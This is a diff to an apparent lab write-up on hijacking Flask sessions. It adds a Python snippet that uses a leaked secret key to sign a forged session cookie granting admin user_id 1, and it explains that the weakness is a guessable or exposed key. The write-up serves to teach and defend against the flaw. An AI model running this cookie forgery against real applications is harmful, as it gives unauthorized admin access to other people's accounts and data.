@@ -19,12 +19,30 @@ decodes to `{"admin_hardened":true,"user_fname":"Buzz","user_id":2}`
 From this, the attacker may infer the user_id of the admin is 1.
 
 Using the secret key, the attacker is able to generate a valid session cookie
-using the admin user id.
+using the admin user id. Here is an example of code that can do this:
+
+```python
+from flask import Flask
+from flask.sessions import SecureCookieSessionInterface
+
+app = Flask(__name__)
+
+app.config['SECRET_KEY'] = 'stolen-secret-key'
+
+forged_payload = {
+    "admin_hardened": True,
+    "user_fname": "Admin",
+    "user_id": 1
+}
+
+serializer = SecureCookieSessionInterface().get_signing_serializer(app)
+forged_cookie = serializer.dumps(forged_payload)
+```
 
 ![Session Hijack after attack](./screenshots/SessHijack/SessHijackAfter.png)
 
 ## Code Vulnerability
-The vulnerability that allows the attacker to use to create a valid new session
+The vulnerability that allows the attacker to create a valid new session
 lies with the secret key of the Flask app. It could be that the
 secret key is not secure enough, with a value such as 'secret-key'. It could
 also be that the secret key was exposed in code pushed to a central repository.
